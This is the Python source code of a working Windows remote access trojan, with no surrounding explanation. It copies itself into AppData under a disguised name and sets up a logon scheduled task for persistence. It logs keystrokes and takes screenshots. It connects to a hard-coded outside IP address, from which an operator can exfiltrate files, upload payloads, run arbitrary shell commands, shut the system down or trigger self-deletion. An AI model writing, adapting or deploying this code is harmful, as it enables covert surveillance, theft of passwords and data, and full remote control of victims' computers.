import socket
import subprocess
import os
import tempfile
import logging
import sys
import time
import platform
import base64
import shutil
import pyautogui
from pynput import keyboard
import psutil  # For process listing and system shutdown

# Configure logging
logging.basicConfig(filename='persistence.log', level=logging.INFO, format='%(asctime)s - %(message)s')
logging.basicConfig(filename=os.path.join(os.environ["appdata"], "keylogs.log"), level=logging.INFO, format='%(asctime)s - %(message)s')
logging.basicConfig(filename='screenshot.log', level=logging.INFO)

def persist():
    try:
        file_location = os.path.join(os.environ["appdata"], "windows32.exe")
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            logging.info(f"File copied to {file_location}")
            result = subprocess.run(
                ['schtasks', '/create', '/sc', 'onlogon', '/tn', 'Windows32', '/tr', file_location],
                capture_output=True, text=True, shell=True
            )
            if result.returncode == 0:
                logging.info("Scheduled task created successfully.")
            else:
                logging.error(f"Failed to create scheduled task. Error: {result.stderr}")
    except Exception as e:
        logging.error(f"Error setting up persistence: {str(e)}")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            logging.info(f"{key.char}")
        elif key == keyboard.Key.space:
            logging.info(" ")
        elif key == keyboard.Key.enter:
            logging.info("\n")
        elif key == keyboard.Key.backspace:
            logging.info("[BACKSPACE]")
        elif key == keyboard.Key.tab:
            logging.info("[TAB]")
        elif key == keyboard.Key.esc:
            logging.info("[ESC]")
        elif key == keyboard.Key.shift:
            logging.info("[SHIFT]")
        elif key == keyboard.Key.ctrl:
            logging.info("[CTRL]")
        elif key == keyboard.Key.alt:
            logging.info("[ALT]")
        else:
            logging.info(f"[{key.name}]")
    except Exception as e:
        logging.error(f"Error logging key {key}: {str(e)}")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def capture_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as temp_file:
            screenshot.save(temp_file, format="PNG")
            temp_file_path = temp_file.name
        with open(temp_file_path, "rb") as f:
            screenshot_data = base64.b64encode(f.read())
        os.remove(temp_file_path)
        return screenshot_data
    except Exception as e:
        logging.error(f"Error capturing screenshot: {str(e)}")
        return None

def self_destruct():
    file_location = os.path.join(os.environ["appdata"], "windows32.exe")
    os.remove(file_location)
    subprocess.call('schtasks /delete /tn "Windows32" /f', shell=True)
    sys.exit()

def list_processes():
    processes = [f"{p.name()} (PID: {p.pid})" for p in psutil.process_iter(['pid', 'name'])]
    return "\n".join(processes)

def shutdown_system():
    subprocess.call('shutdown /s /t 1', shell=True)

def list_files(directory):
    try:
        files = os.listdir(directory)
        return "\n".join(files)
    except Exception as e:
        return f"Error: {str(e)}"

def change_directory(directory):
    try:
        os.chdir(directory)
        return f"Changed directory to {os.getcwd()}"
    except Exception as e:
        return f"Error: {str(e)}"

def file_details(file_path):
    try:
        stats = os.stat(file_path)
        details = f"Size: {stats.st_size} bytes\n"
        details += f"Creation Time: {time.ctime(stats.st_ctime)}\n"
        details += f"Modification Time: {time.ctime(stats.st_mtime)}\n"
        return details
    except Exception as e:
        return f"Error: {str(e)}"

def command_handler(s):
    CHUNK_SIZE = 4096
    
    while True:
        try:
            command = s.recv(2048).decode()
            if command.lower() == "exit":
                break
            elif command.lower() == "sysinfo":
                sysinfo = f"OS: {platform.system()} {platform.release()}\n"
                sysinfo += f"Hostname: {socket.gethostname()}\n"
                sysinfo += f"User: {os.getlogin()}\n"
                s.send(sysinfo.encode())
            elif command.lower().startswith("listfiles"):
                _, directory = command.split("*", 1)
                files = list_files(directory)
                s.send(files.encode())
            elif command.lower().startswith("chdir"):
                _, directory = command.split("*", 1)
                result = change_directory(directory)
                s.send(result.encode())
            elif command.lower().startswith("filedetails"):
                _, file_path = command.split("*", 1)
                details = file_details(file_path)
                s.send(details.encode())
            elif command.lower().startswith("download"):
                _, file_path = command.split("*", 1)
                if os.path.exists(file_path):
                    with open(file_path, "rb") as f:
                        while True:
                            chunk = f.read(CHUNK_SIZE)
                            if not chunk:
                                break
                            s.send(base64.b64encode(chunk))
                        s.send(b"EOF")
                else:
                    s.send("File not found.".encode())
            elif command.lower().startswith("upload"):
                _, file_path = command.split("*", 1)
                with open(file_path, "wb") as f:
                    while True:
                        chunk = s.recv(CHUNK_SIZE)
                        if chunk == b"EOF":
                            break
                        f.write(base64.b64decode(chunk))
                s.send("File uploaded successfully.".encode())
            elif command.lower() == "screenshot":
                screenshot_data = capture_screenshot()
                s.send(screenshot_data)
            elif command.lower() == "selfdestruct":
                self_destruct()
            elif command.lower() == "listprocesses":
                processes = list_processes()
                s.send(processes.encode())
            elif command.lower() == "shutdown":
                shutdown_system()
            else:
                output = subprocess.getoutput(command)
                if not output:
                    output = "Command executed."
                s.send(output.encode())
        except Exception as e:
            s.send(f"Error: {str(e)}".encode())
            continue

def main():
    persist()
    start_keylogger()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect(("159.65.152.59", 7777))
            break
        except:
            time.sleep(5)

    command_handler(s)
    s.close()

if __name__ == "__main__":
    main()
